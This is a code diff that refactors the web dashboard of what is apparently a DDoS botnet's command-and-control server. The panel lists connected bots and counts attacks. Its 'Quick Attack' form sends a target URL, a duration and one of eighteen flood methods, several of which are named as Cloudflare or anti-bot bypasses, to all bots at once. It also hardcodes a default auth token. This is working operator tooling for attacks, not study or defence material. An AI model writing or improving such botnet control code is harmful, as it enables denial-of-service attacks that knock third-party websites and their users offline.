@@ -375,342 +375,343 @@ app.get('/health', (req, res) => {
 });
 
 // ========== WEB UI – SERVED ON ROOT AND /dashboard ==========
-const HTML_UI = `
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>C2 Dashboard</title>
-  <style>
-    * { margin: 0; padding: 0; box-sizing: border-box; }
-    body {
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      background: #0d1117;
-      color: #e6edf3;
-      padding: 20px;
-    }
-    .container { max-width: 1400px; margin: 0 auto; }
-    .header {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      padding: 15px 20px;
-      background: #161b22;
-      border-radius: 12px;
-      border: 1px solid #30363d;
-      margin-bottom: 20px;
-      flex-wrap: wrap;
-      gap: 10px;
-    }
-    .header h1 { font-size: 24px; color: #58a6ff; }
-    .status { font-size: 14px; color: #8b949e; }
-    .status span { color: #2ea043; font-weight: bold; }
-    .login-box {
-      display: flex;
-      gap: 10px;
-      align-items: center;
-    }
-    .login-box input {
-      padding: 8px 12px;
-      border-radius: 6px;
-      border: 1px solid #30363d;
-      background: #0d1117;
-      color: #e6edf3;
-    }
-    .login-box button {
-      padding: 8px 16px;
-      border-radius: 6px;
-      border: none;
-      background: #238636;
-      color: #fff;
-      cursor: pointer;
-      font-weight: bold;
-    }
-    .login-box button:hover { background: #2ea043; }
-    .grid {
-      display: grid;
-      grid-template-columns: 1fr 1fr;
-      gap: 20px;
-      margin-bottom: 20px;
-    }
-    .card {
-      background: #161b22;
-      border: 1px solid #30363d;
-      border-radius: 12px;
-      padding: 20px;
-    }
-    .card h3 {
-      font-size: 16px;
-      color: #8b949e;
-      margin-bottom: 12px;
-      border-bottom: 1px solid #30363d;
-      padding-bottom: 8px;
-    }
-    .stats-grid {
-      display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
-      gap: 10px;
-    }
-    .stat-item {
-      background: #0d1117;
-      padding: 12px;
-      border-radius: 8px;
-      text-align: center;
-    }
-    .stat-item .value { font-size: 22px; font-weight: bold; color: #58a6ff; }
-    .stat-item .label { font-size: 12px; color: #8b949e; margin-top: 4px; }
-    .bot-list {
-      max-height: 400px;
-      overflow-y: auto;
-    }
-    .bot-item {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-      padding: 8px 12px;
-      border-bottom: 1px solid #21262d;
-      font-size: 14px;
-      flex-wrap: wrap;
-      gap: 5px;
-    }
-    .bot-item .id { color: #58a6ff; font-family: monospace; font-size: 12px; }
-    .bot-item .status { font-weight: bold; }
-    .bot-item .status.online { color: #2ea043; }
-    .bot-item .status.offline { color: #f85149; }
-    .bot-item .attacking { color: #d29922; }
-    .attack-form {
-      display: grid;
-      grid-template-columns: 1fr 1fr;
-      gap: 10px;
-      margin-top: 10px;
-    }
-    .attack-form input, .attack-form select, .attack-form button {
-      padding: 8px 12px;
-      border-radius: 6px;
-      border: 1px solid #30363d;
-      background: #0d1117;
-      color: #e6edf3;
-    }
-    .attack-form button {
-      background: #238636;
-      border: none;
-      cursor: pointer;
-      font-weight: bold;
-      grid-column: span 2;
-    }
-    .attack-form button:hover { background: #2ea043; }
-    .attack-form button.stop { background: #da3633; }
-    .attack-form button.stop:hover { background: #f85149; }
-    .actions {
-      display: flex;
-      gap: 10px;
-      margin-top: 10px;
-      flex-wrap: wrap;
-    }
-    .actions button {
-      padding: 8px 16px;
-      border-radius: 6px;
-      border: none;
-      cursor: pointer;
-      font-weight: bold;
-      color: #fff;
-    }
-    .actions .stop-all { background: #da3633; }
-    .actions .stop-all:hover { background: #f85149; }
-    .actions .refresh { background: #1f6feb; }
-    .actions .refresh:hover { background: #388bfd; }
-    .log-area {
-      background: #0d1117;
-      border: 1px solid #30363d;
-      border-radius: 8px;
-      padding: 12px;
-      max-height: 200px;
-      overflow-y: auto;
-      font-family: monospace;
-      font-size: 13px;
-      margin-top: 20px;
-      white-space: pre-wrap;
-    }
-    @media (max-width: 768px) {
-      .grid { grid-template-columns: 1fr; }
-      .header { flex-direction: column; align-items: stretch; }
-      .login-box { justify-content: center; }
-    }
-  </style>
-</head>
-<body>
-<div class="container">
-  <div class="header">
-    <h1>🎯 C2 Dashboard</h1>
-    <div class="status">
-      <span id="serverStatus">●</span> Online &nbsp;|&nbsp; Uptime: <span id="uptime">0</span>s
-    </div>
-    <div class="login-box">
-      <input type="password" id="tokenInput" placeholder="Auth Token" value="ricardo">
-      <button onclick="login()">Login</button>
-    </div>
-  </div>
-
-  <div class="grid">
-    <div class="card">
-      <h3>📊 Statistics</h3>
-      <div class="stats-grid" id="statsGrid">
-        <div class="stat-item"><div class="value" id="statTotalBots">0</div><div class="label">Total Bots</div></div>
-        <div class="stat-item"><div class="value" id="statOnlineBots">0</div><div class="label">Online</div></div>
-        <div class="stat-item"><div class="value" id="statActiveAttacks">0</div><div class="label">Active Attacks</div></div>
-        <div class="stat-item"><div class="value" id="statTotalAttacks">0</div><div class="label">Total Attacks</div></div>
-        <div class="stat-item"><div class="value" id="statTotalRequests">0</div><div class="label">Total Requests</div></div>
-      </div>
-    </div>
-    <div class="card">
-      <h3>🎯 Quick Attack</h3>
-      <div class="attack-form">
-        <input type="text" id="attackTarget" placeholder="Target URL (e.g., https://example.com)">
-        <input type="number" id="attackTime" placeholder="Time (seconds)" value="60">
-        <select id="attackMethod">
-          <option value="RAW-GET">RAW-GET</option>
-          <option value="CF-BYPASS">CF-BYPASS</option>
-          <option value="MODERN-FLOOD">MODERN-FLOOD</option>
-          <option value="HTTP-SICARIO">HTTP-SICARIO</option>
-          <option value="RAW-HTTP">RAW-HTTP</option>
-          <option value="R9">R9</option>
-          <option value="PRIV-TOR">PRIV-TOR</option>
-          <option value="HOLD-PANEL">HOLD-PANEL</option>
-          <option value="R1">R1</option>
-          <option value="UAM">UAM</option>
-          <option value="W.I.L">W.I.L</option>
-          <option value="BYPASS">BYPASS</option>
-          <option value="VHOLD">VHOLD</option>
-          <option value="W-FLOOD">W-FLOOD</option>
-          <option value="STRESS">STRESS</option>
-          <option value="CURL-SPAM">CURL-SPAM</option>
-          <option value="RAPID10">RAPID10</option>
-          <option value="R10">R10</option>
-        </select>
-        <button onclick="attackAll()">🚀 Attack All Bots</button>
-        <button class="stop" onclick="stopAll()">⏹ Stop All</button>
-      </div>
-    </div>
-  </div>
-
-  <div class="card">
-    <h3>🤖 Bots <span id="botCount">(0)</span></h3>
-    <div class="actions">
-      <button class="refresh" onclick="refreshData()">🔄 Refresh</button>
-      <button class="stop-all" onclick="stopAll()">⏹ Stop All Attacks</button>
-    </div>
-    <div class="bot-list" id="botList">
-      <div style="color:#8b949e; text-align:center; padding:20px;">Loading bots...</div>
-    </div>
-  </div>
-
-  <div class="log-area" id="logArea">📋 Logs will appear here...</div>
-</div>
-
-<script>
-  let token = localStorage.getItem('c2_token') || 'ricardo';
-  document.getElementById('tokenInput').value = token;
-
-  function login() {
-    token = document.getElementById('tokenInput').value;
-    localStorage.setItem('c2_token', token);
-    refreshData();
-  }
-
-  async function apiCall(endpoint, options = {}) {
-    const headers = { 'Authorization': token, ...options.headers };
-    const res = await fetch(endpoint, { ...options, headers });
-    if (res.status === 401) {
-      alert('Unauthorized – please check your token.');
-      return null;
-    }
-    return res.json();
-  }
-
-  function log(msg) {
-    const area = document.getElementById('logArea');
-    const time = new Date().toLocaleTimeString();
-    area.textContent += `[${time}] ${msg}\n`;
-    area.scrollTop = area.scrollHeight;
-  }
-
-  async function refreshData() {
-    try {
-      const botsData = await apiCall('/bots');
-      if (botsData) {
-        const bots = botsData.bots || [];
-        const list = document.getElementById('botList');
-        if (bots.length === 0) {
-          list.innerHTML = '<div style="color:#8b949e; text-align:center; padding:20px;">No bots connected.</div>';
-        } else {
-          list.innerHTML = bots.map(b => \`
-            <div class="bot-item">
-              <span class="id">\${b.id}</span>
-              <span>\${b.name}</span>
-              <span class="status \${b.online ? 'online' : 'offline'}">\${b.online ? '● Online' : '● Offline'}</span>
-              <span class="attacking">\${b.attacking ? '🔥 Attacking' : '⏸ Idle'}</span>
-              <span>Attacks: \${b.attacksPerformed}</span>
-            </div>
-          \`).join('');
-        }
-        document.getElementById('botCount').textContent = `(${bots.length})`;
-      }
-
-      const stats = await apiCall('/api/stats');
-      if (stats) {
-        document.getElementById('statTotalBots').textContent = stats.totalBots || 0;
-        document.getElementById('statOnlineBots').textContent = stats.onlineBots || 0;
-        document.getElementById('statActiveAttacks').textContent = stats.activeAttacks || 0;
-        document.getElementById('statTotalAttacks').textContent = stats.totalAttacks || 0;
-        document.getElementById('statTotalRequests').textContent = stats.totalRequests || 0;
-        document.getElementById('uptime').textContent = stats.uptime || 0;
-      }
-    } catch (e) {
-      log('❌ Error refreshing: ' + e.message);
-    }
-  }
-
-  async function attackAll() {
-    const target = document.getElementById('attackTarget').value.trim();
-    const time = document.getElementById('attackTime').value;
-    const method = document.getElementById('attackMethod').value;
-    if (!target) { alert('Please enter a target URL.'); return; }
-    log(\`🚀 Sending attack-all: \${method} -> \${target} for \${time}s\`);
-    try {
-      const result = await apiCall(\`/attack-all?target=\${encodeURIComponent(target)}&time=\${time}&methods=\${method}\`);
-      if (result && result.success) {
-        log(\`✅ Attack sent to \${result.sent}/\${result.total} bots\`);
-        if (result.failed && result.failed.length) {
-          log(\`⚠️ Failed bots: \${result.failed.join(', ')}\`);
-        }
-      } else {
-        log(\`❌ Attack failed: \${result?.error || 'Unknown error'}\`);
-      }
-    } catch (e) { log('❌ Error: ' + e.message); }
-    refreshData();
-  }
-
-  async function stopAll() {
-    log('⏹ Stopping all attacks...');
-    try {
-      const result = await apiCall('/stop-all');
-      if (result && result.success) {
-        log('✅ All attacks stopped.');
-      } else {
-        log('❌ Failed to stop attacks.');
-      }
-    } catch (e) { log('❌ Error: ' + e.message); }
-    refreshData();
-  }
-
-  setInterval(refreshData, 5000);
-  login();
-  refreshData();
-</script>
-</body>
-</html>
-`;
+// HTML content as a regular string (no template literals inside)
+const HTML_UI = [
+  '<!DOCTYPE html>',
+  '<html lang="en">',
+  '<head>',
+  '  <meta charset="UTF-8">',
+  '  <meta name="viewport" content="width=device-width, initial-scale=1.0">',
+  '  <title>C2 Dashboard</title>',
+  '  <style>',
+  '    * { margin: 0; padding: 0; box-sizing: border-box; }',
+  '    body {',
+  '      font-family: \'Segoe UI\', Tahoma, Geneva, Verdana, sans-serif;',
+  '      background: #0d1117;',
+  '      color: #e6edf3;',
+  '      padding: 20px;',
+  '    }',
+  '    .container { max-width: 1400px; margin: 0 auto; }',
+  '    .header {',
+  '      display: flex;',
+  '      justify-content: space-between;',
+  '      align-items: center;',
+  '      padding: 15px 20px;',
+  '      background: #161b22;',
+  '      border-radius: 12px;',
+  '      border: 1px solid #30363d;',
+  '      margin-bottom: 20px;',
+  '      flex-wrap: wrap;',
+  '      gap: 10px;',
+  '    }',
+  '    .header h1 { font-size: 24px; color: #58a6ff; }',
+  '    .status { font-size: 14px; color: #8b949e; }',
+  '    .status span { color: #2ea043; font-weight: bold; }',
+  '    .login-box {',
+  '      display: flex;',
+  '      gap: 10px;',
+  '      align-items: center;',
+  '    }',
+  '    .login-box input {',
+  '      padding: 8px 12px;',
+  '      border-radius: 6px;',
+  '      border: 1px solid #30363d;',
+  '      background: #0d1117;',
+  '      color: #e6edf3;',
+  '    }',
+  '    .login-box button {',
+  '      padding: 8px 16px;',
+  '      border-radius: 6px;',
+  '      border: none;',
+  '      background: #238636;',
+  '      color: #fff;',
+  '      cursor: pointer;',
+  '      font-weight: bold;',
+  '    }',
+  '    .login-box button:hover { background: #2ea043; }',
+  '    .grid {',
+  '      display: grid;',
+  '      grid-template-columns: 1fr 1fr;',
+  '      gap: 20px;',
+  '      margin-bottom: 20px;',
+  '    }',
+  '    .card {',
+  '      background: #161b22;',
+  '      border: 1px solid #30363d;',
+  '      border-radius: 12px;',
+  '      padding: 20px;',
+  '    }',
+  '    .card h3 {',
+  '      font-size: 16px;',
+  '      color: #8b949e;',
+  '      margin-bottom: 12px;',
+  '      border-bottom: 1px solid #30363d;',
+  '      padding-bottom: 8px;',
+  '    }',
+  '    .stats-grid {',
+  '      display: grid;',
+  '      grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));',
+  '      gap: 10px;',
+  '    }',
+  '    .stat-item {',
+  '      background: #0d1117;',
+  '      padding: 12px;',
+  '      border-radius: 8px;',
+  '      text-align: center;',
+  '    }',
+  '    .stat-item .value { font-size: 22px; font-weight: bold; color: #58a6ff; }',
+  '    .stat-item .label { font-size: 12px; color: #8b949e; margin-top: 4px; }',
+  '    .bot-list {',
+  '      max-height: 400px;',
+  '      overflow-y: auto;',
+  '    }',
+  '    .bot-item {',
+  '      display: flex;',
+  '      justify-content: space-between;',
+  '      align-items: center;',
+  '      padding: 8px 12px;',
+  '      border-bottom: 1px solid #21262d;',
+  '      font-size: 14px;',
+  '      flex-wrap: wrap;',
+  '      gap: 5px;',
+  '    }',
+  '    .bot-item .id { color: #58a6ff; font-family: monospace; font-size: 12px; }',
+  '    .bot-item .status { font-weight: bold; }',
+  '    .bot-item .status.online { color: #2ea043; }',
+  '    .bot-item .status.offline { color: #f85149; }',
+  '    .bot-item .attacking { color: #d29922; }',
+  '    .attack-form {',
+  '      display: grid;',
+  '      grid-template-columns: 1fr 1fr;',
+  '      gap: 10px;',
+  '      margin-top: 10px;',
+  '    }',
+  '    .attack-form input, .attack-form select, .attack-form button {',
+  '      padding: 8px 12px;',
+  '      border-radius: 6px;',
+  '      border: 1px solid #30363d;',
+  '      background: #0d1117;',
+  '      color: #e6edf3;',
+  '    }',
+  '    .attack-form button {',
+  '      background: #238636;',
+  '      border: none;',
+  '      cursor: pointer;',
+  '      font-weight: bold;',
+  '      grid-column: span 2;',
+  '    }',
+  '    .attack-form button:hover { background: #2ea043; }',
+  '    .attack-form button.stop { background: #da3633; }',
+  '    .attack-form button.stop:hover { background: #f85149; }',
+  '    .actions {',
+  '      display: flex;',
+  '      gap: 10px;',
+  '      margin-top: 10px;',
+  '      flex-wrap: wrap;',
+  '    }',
+  '    .actions button {',
+  '      padding: 8px 16px;',
+  '      border-radius: 6px;',
+  '      border: none;',
+  '      cursor: pointer;',
+  '      font-weight: bold;',
+  '      color: #fff;',
+  '    }',
+  '    .actions .stop-all { background: #da3633; }',
+  '    .actions .stop-all:hover { background: #f85149; }',
+  '    .actions .refresh { background: #1f6feb; }',
+  '    .actions .refresh:hover { background: #388bfd; }',
+  '    .log-area {',
+  '      background: #0d1117;',
+  '      border: 1px solid #30363d;',
+  '      border-radius: 8px;',
+  '      padding: 12px;',
+  '      max-height: 200px;',
+  '      overflow-y: auto;',
+  '      font-family: monospace;',
+  '      font-size: 13px;',
+  '      margin-top: 20px;',
+  '      white-space: pre-wrap;',
+  '    }',
+  '    @media (max-width: 768px) {',
+  '      .grid { grid-template-columns: 1fr; }',
+  '      .header { flex-direction: column; align-items: stretch; }',
+  '      .login-box { justify-content: center; }',
+  '    }',
+  '  </style>',
+  '</head>',
+  '<body>',
+  '<div class="container">',
+  '  <div class="header">',
+  '    <h1>🎯 C2 Dashboard</h1>',
+  '    <div class="status">',
+  '      <span id="serverStatus">●</span> Online &nbsp;|&nbsp; Uptime: <span id="uptime">0</span>s',
+  '    </div>',
+  '    <div class="login-box">',
+  '      <input type="password" id="tokenInput" placeholder="Auth Token" value="ricardo">',
+  '      <button onclick="login()">Login</button>',
+  '    </div>',
+  '  </div>',
+  '',
+  '  <div class="grid">',
+  '    <div class="card">',
+  '      <h3>📊 Statistics</h3>',
+  '      <div class="stats-grid" id="statsGrid">',
+  '        <div class="stat-item"><div class="value" id="statTotalBots">0</div><div class="label">Total Bots</div></div>',
+  '        <div class="stat-item"><div class="value" id="statOnlineBots">0</div><div class="label">Online</div></div>',
+  '        <div class="stat-item"><div class="value" id="statActiveAttacks">0</div><div class="label">Active Attacks</div></div>',
+  '        <div class="stat-item"><div class="value" id="statTotalAttacks">0</div><div class="label">Total Attacks</div></div>',
+  '        <div class="stat-item"><div class="value" id="statTotalRequests">0</div><div class="label">Total Requests</div></div>',
+  '      </div>',
+  '    </div>',
+  '    <div class="card">',
+  '      <h3>🎯 Quick Attack</h3>',
+  '      <div class="attack-form">',
+  '        <input type="text" id="attackTarget" placeholder="Target URL (e.g., https://example.com)">',
+  '        <input type="number" id="attackTime" placeholder="Time (seconds)" value="60">',
+  '        <select id="attackMethod">',
+  '          <option value="RAW-GET">RAW-GET</option>',
+  '          <option value="CF-BYPASS">CF-BYPASS</option>',
+  '          <option value="MODERN-FLOOD">MODERN-FLOOD</option>',
+  '          <option value="HTTP-SICARIO">HTTP-SICARIO</option>',
+  '          <option value="RAW-HTTP">RAW-HTTP</option>',
+  '          <option value="R9">R9</option>',
+  '          <option value="PRIV-TOR">PRIV-TOR</option>',
+  '          <option value="HOLD-PANEL">HOLD-PANEL</option>',
+  '          <option value="R1">R1</option>',
+  '          <option value="UAM">UAM</option>',
+  '          <option value="W.I.L">W.I.L</option>',
+  '          <option value="BYPASS">BYPASS</option>',
+  '          <option value="VHOLD">VHOLD</option>',
+  '          <option value="W-FLOOD">W-FLOOD</option>',
+  '          <option value="STRESS">STRESS</option>',
+  '          <option value="CURL-SPAM">CURL-SPAM</option>',
+  '          <option value="RAPID10">RAPID10</option>',
+  '          <option value="R10">R10</option>',
+  '        </select>',
+  '        <button onclick="attackAll()">🚀 Attack All Bots</button>',
+  '        <button class="stop" onclick="stopAll()">⏹ Stop All</button>',
+  '      </div>',
+  '    </div>',
+  '  </div>',
+  '',
+  '  <div class="card">',
+  '    <h3>🤖 Bots <span id="botCount">(0)</span></h3>',
+  '    <div class="actions">',
+  '      <button class="refresh" onclick="refreshData()">🔄 Refresh</button>',
+  '      <button class="stop-all" onclick="stopAll()">⏹ Stop All Attacks</button>',
+  '    </div>',
+  '    <div class="bot-list" id="botList">',
+  '      <div style="color:#8b949e; text-align:center; padding:20px;">Loading bots...</div>',
+  '    </div>',
+  '  </div>',
+  '',
+  '  <div class="log-area" id="logArea">📋 Logs will appear here...</div>',
+  '</div>',
+  '',
+  '<script>',
+  '  let token = localStorage.getItem("c2_token") || "ricardo";',
+  '  document.getElementById("tokenInput").value = token;',
+  '',
+  '  function login() {',
+  '    token = document.getElementById("tokenInput").value;',
+  '    localStorage.setItem("c2_token", token);',
+  '    refreshData();',
+  '  }',
+  '',
+  '  async function apiCall(endpoint, options = {}) {',
+  '    const headers = { "Authorization": token, ...options.headers };',
+  '    const res = await fetch(endpoint, { ...options, headers });',
+  '    if (res.status === 401) {',
+  '      alert("Unauthorized – please check your token.");',
+  '      return null;',
+  '    }',
+  '    return res.json();',
+  '  }',
+  '',
+  '  function log(msg) {',
+  '    const area = document.getElementById("logArea");',
+  '    const time = new Date().toLocaleTimeString();',
+  '    area.textContent += "[" + time + "] " + msg + "\\n";',
+  '    area.scrollTop = area.scrollHeight;',
+  '  }',
+  '',
+  '  async function refreshData() {',
+  '    try {',
+  '      const botsData = await apiCall("/bots");',
+  '      if (botsData) {',
+  '        const bots = botsData.bots || [];',
+  '        const list = document.getElementById("botList");',
+  '        if (bots.length === 0) {',
+  '          list.innerHTML = "<div style=\\"color:#8b949e; text-align:center; padding:20px;\\">No bots connected.</div>";',
+  '        } else {',
+  '          list.innerHTML = bots.map(function(b) {',
+  '            return "<div class=\\"bot-item\\">" +',
+  '              "<span class=\\"id\\">" + b.id + "</span>" +',
+  '              "<span>" + b.name + "</span>" +',
+  '              "<span class=\\"status " + (b.online ? "online" : "offline") + "\\">" + (b.online ? "● Online" : "● Offline") + "</span>" +',
+  '              "<span class=\\"attacking\\">" + (b.attacking ? "🔥 Attacking" : "⏸ Idle") + "</span>" +',
+  '              "<span>Attacks: " + b.attacksPerformed + "</span>" +',
+  '            "</div>";',
+  '          }).join("");',
+  '        }',
+  '        document.getElementById("botCount").textContent = "(" + bots.length + ")";',
+  '      }',
+  '',
+  '      const stats = await apiCall("/api/stats");',
+  '      if (stats) {',
+  '        document.getElementById("statTotalBots").textContent = stats.totalBots || 0;',
+  '        document.getElementById("statOnlineBots").textContent = stats.onlineBots || 0;',
+  '        document.getElementById("statActiveAttacks").textContent = stats.activeAttacks || 0;',
+  '        document.getElementById("statTotalAttacks").textContent = stats.totalAttacks || 0;',
+  '        document.getElementById("statTotalRequests").textContent = stats.totalRequests || 0;',
+  '        document.getElementById("uptime").textContent = stats.uptime || 0;',
+  '      }',
+  '    } catch (e) {',
+  '      log("❌ Error refreshing: " + e.message);',
+  '    }',
+  '  }',
+  '',
+  '  async function attackAll() {',
+  '    const target = document.getElementById("attackTarget").value.trim();',
+  '    const time = document.getElementById("attackTime").value;',
+  '    const method = document.getElementById("attackMethod").value;',
+  '    if (!target) { alert("Please enter a target URL."); return; }',
+  '    log("🚀 Sending attack-all: " + method + " -> " + target + " for " + time + "s");',
+  '    try {',
+  '      const result = await apiCall("/attack-all?target=" + encodeURIComponent(target) + "&time=" + time + "&methods=" + method);',
+  '      if (result && result.success) {',
+  '        log("✅ Attack sent to " + result.sent + "/" + result.total + " bots");',
+  '        if (result.failed && result.failed.length) {',
+  '          log("⚠️ Failed bots: " + result.failed.join(", "));',
+  '        }',
+  '      } else {',
+  '        log("❌ Attack failed: " + (result?.error || "Unknown error"));',
+  '      }',
+  '    } catch (e) { log("❌ Error: " + e.message); }',
+  '    refreshData();',
+  '  }',
+  '',
+  '  async function stopAll() {',
+  '    log("⏹ Stopping all attacks...");',
+  '    try {',
+  '      const result = await apiCall("/stop-all");',
+  '      if (result && result.success) {',
+  '        log("✅ All attacks stopped.");',
+  '      } else {',
+  '        log("❌ Failed to stop attacks.");',
+  '      }',
+  '    } catch (e) { log("❌ Error: " + e.message); }',
+  '    refreshData();',
+  '  }',
+  '',
+  '  setInterval(refreshData, 5000);',
+  '  login();',
+  '  refreshData();',
+  '</script>',
+  '</body>',
+  '</html>'
+].join('\n');
 
 // Serve UI on root and /dashboard
 app.get(['/', '/dashboard'], (req, res) => {
